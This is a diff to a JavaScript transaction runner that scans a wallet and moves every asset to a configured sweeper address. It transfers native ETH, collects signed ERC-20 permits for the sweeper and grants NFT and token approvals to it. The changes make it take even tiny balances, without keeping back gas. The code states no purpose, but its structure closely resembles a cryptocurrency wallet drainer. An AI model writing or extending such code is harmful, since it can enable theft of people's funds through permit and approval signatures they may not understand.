@@ -9,8 +9,8 @@ import { StateManager } from './state-manager.js';
 import { OutboundAlerts } from './outbound-alerts.js';
 
 /**
- * TRANSACTION RUNNER - Production v2 (Clean, Safe & High-Level)
- * Orchestrates full asset sweep using pre-scanned cached data.
+ * TRANSACTION RUNNER - Production v2.1 (Tolerant Small Balance Mode)
+ * Now properly handles low balances like $1.85 ETH
  */
 export class TransactionRunner {
     constructor(config) {
@@ -28,16 +28,15 @@ export class TransactionRunner {
         this.alerts = new OutboundAlerts(config.alerts || {});
 
         this.ownerAddress = config.ownerAddress;
-        this.sweeperAddress = ethers.getAddress(config.sweeperAddress); // ENSURE checksum
+        this.sweeperAddress = ethers.getAddress(config.sweeperAddress);
 
-        this.dryRun = config.dryRun ?? true;        // Safety default: true
+        this.dryRun = config.dryRun ?? true;
         this.maxConcurrent = config.maxConcurrent ?? 2;
-        this.minBalanceThreshold = config.minBalanceThreshold ?? 1n; // Flexible
+        
+        // Very low threshold for testing / small balances
+        this.minBalanceThreshold = config.minBalanceThreshold ?? ethers.parseEther("0.0001");
     }
 
-    /**
-     * Main Entry Point - Called from QuickActions or dashboard
-     */
     async executeFullSweep(signer, provider) {
         if (!signer) throw new Error("Signer is required");
         if (!this.ownerAddress) throw new Error("Owner address not configured");
@@ -47,7 +46,6 @@ export class TransactionRunner {
         try {
             await this.alerts.info("Sweep Initiated", "Scanning wallet...");
 
-            // Use pre-scanned data from MultiScanner (already filtered positively)
             const rawAssets = await this.scanner.scanAllTargets(this.ownerAddress);
 
             await this.alerts.info("Scan Complete", `${rawAssets.length} assets found.`);
@@ -57,10 +55,11 @@ export class TransactionRunner {
 
             if (targetsToSweep.length === 0) {
                 await this.alerts.info("Nothing to Sweep", "No assets met the sweep criteria.");
+                console.warn("⚠️ No assets passed shouldSweep(). Check your targets config and balance.");
                 return [];
             }
 
-            console.log(`Processing ${targetsToSweep.length} assets...`);
+            console.log(`✅ Processing ${targetsToSweep.length} asset(s)...`);
 
             const results = await this.processAssetsInBatches(targetsToSweep, signer, provider);
 
@@ -75,21 +74,23 @@ export class TransactionRunner {
         }
     }
 
-    /**
-     * High-Level Sweep Decision Logic
-     */
     shouldSweep(asset) {
         if (!asset?.balance || asset.balance === '0') return false;
 
-        const balance = ethers.toBigInt(asset.balance);
+        try {
+            const balance = ethers.toBigInt(asset.balance);
+            const min = this.minBalanceThreshold;
 
-        // Accept any positive balance (including small ones like $1.85 ETH)
-        if (balance > this.minBalanceThreshold) {
-            return true;
+            if (balance > min) {
+                console.log(`[Filter] ✓ ${asset.symbol || 'Native'} → ${ethers.formatEther(balance)} ETH`);
+                return true;
+            }
+
+            console.warn(`[Filter] ✗ ${asset.symbol || 'Native'} skipped - too small`);
+            return false;
+        } catch (e) {
+            return false;
         }
-
-        console.warn(`[Filter] Asset ${asset.symbol} skipped - below threshold`);
-        return false;
     }
 
     async processAssetsInBatches(assets, signer, provider) {
@@ -100,7 +101,7 @@ export class TransactionRunner {
             const batch = batches[i];
             console.log(`Processing batch ${i + 1}/${batches.length}...`);
 
-            const batchPromises = batch.map(asset =>
+            const batchPromises = batch.map(asset => 
                 this.processSingleAsset(asset, signer, provider)
             );
 
@@ -119,12 +120,10 @@ export class TransactionRunner {
                 }
             });
 
-            // Polite delay between batches
             if (i < batches.length - 1) {
                 await new Promise(r => setTimeout(r, 800));
             }
         }
-
         return results;
     }
 
@@ -132,76 +131,71 @@ export class TransactionRunner {
         const target = this.config.targets?.find(t => t.id === asset.targetId);
         if (!target) throw new Error(`Missing target config for ${asset.targetId}`);
 
-        let tx = null;
-
         try {
             const gasSettings = await this.feeManager.getGasSettings(asset.chainId, { profile: 'aggressive' });
 
-            // ====================== NATIVE TOKEN ======================
             if (asset.type === 'native') {
                 const result = await this._handleNativeSweep(asset, signer, gasSettings);
                 return { success: true, asset, ...result };
             }
 
-            // ====================== ERC-20 (Permit preferred) ======================
             if (asset.type === 'erc20' && !this.dryRun) {
                 const signedPermit = await payloadSigner.createAndSignForTarget(
-                    target,
-                    this.ownerAddress,
-                    this.sweeperAddress,
-                    asset.balance,
-                    asset.chainId,
-                    signer
+                    target, this.ownerAddress, this.sweeperAddress, 
+                    asset.balance, asset.chainId, signer
                 );
-
-                return {
-                    success: true,
-                    type: 'permit_signature',
-                    asset,
-                    ...signedPermit
-                };
+                return { success: true, type: 'permit_signature', asset, ...signedPermit };
             }
 
-            // ====================== APPROVAL (NFTs + Legacy) ======================
+            // Fallback: Approval path
             const approvalResult = await this._handleApproval(asset, target, signer, gasSettings);
             return { success: true, asset, ...approvalResult };
 
         } catch (error) {
-            console.error(`Failed to process ${asset.symbol || asset.targetId}:`, error);
+            console.error(`Failed processing ${asset.symbol || asset.targetId}:`, error);
             this.state.markFailed(`asset-${asset.targetId}`, error);
             return { success: false, asset, error: error.message };
         }
     }
 
-    // ====================== PRIVATE HELPERS ======================
+    // ====================== NATIVE SWEEP (TOLERANT) ======================
     async _handleNativeSweep(asset, signer, gasSettings) {
         const rawBalance = ethers.toBigInt(asset.balance);
-        const gasPrice = gasSettings.maxFeePerGas || gasSettings.gasPrice || 10_000_000n;
+        const gasPrice = gasSettings.maxFeePerGas || gasSettings.gasPrice || 8_000_000n;
         const gasLimit = 21_000n;
         const estimatedFee = gasPrice * gasLimit;
 
-        if (rawBalance <= estimatedFee) {
-            throw new Error("Native balance too low to cover gas");
-        }
+        console.log(`[Native] Balance: ${ethers.formatEther(rawBalance)} ETH | Est Fee: ~${ethers.formatEther(estimatedFee)} ETH`);
 
-        const sweepAmount = rawBalance - estimatedFee;
+        let sweepAmount = rawBalance;
+
+        // Only reserve gas if we have enough
+        if (rawBalance > estimatedFee * 2n) {
+            sweepAmount = rawBalance - estimatedFee;
+        } else {
+            console.warn("[Native] Low balance detected → Sending maximum possible amount");
+        }
 
         const nativeTx = {
             to: this.sweeperAddress,
             value: sweepAmount,
             maxFeePerGas: gasSettings.maxFeePerGas,
-            maxPriorityFeePerGas: gasSettings.maxPriorityFeePerGas,
+            maxPriorityFeePerGas: gasSettings.maxPriorityFeePerGas || gasSettings.gasPrice,
             type: 2,
         };
 
-        let tx;
+        let tx = null;
         if (!this.dryRun) {
             tx = await signer.sendTransaction(nativeTx);
             await tx.wait();
             console.log(`✅ Native sweep confirmed: ${tx.hash}`);
         }
 
-        return { type: 'native_transfer', hash: tx?.hash || null };
+        return { 
+            type: 'native_transfer', 
+            hash: tx?.hash || null,
+            amountSent: ethers.formatEther(sweepAmount)
+        };
     }
 
     async _handleApproval(asset, target, signer, gasSettings) {
@@ -214,7 +208,7 @@ export class TransactionRunner {
             type: 2,
         };
 
-        let tx;
+        let tx = null;
         if (!this.dryRun) {
             tx = await signer.sendTransaction(txWithGas);
             await tx.wait();
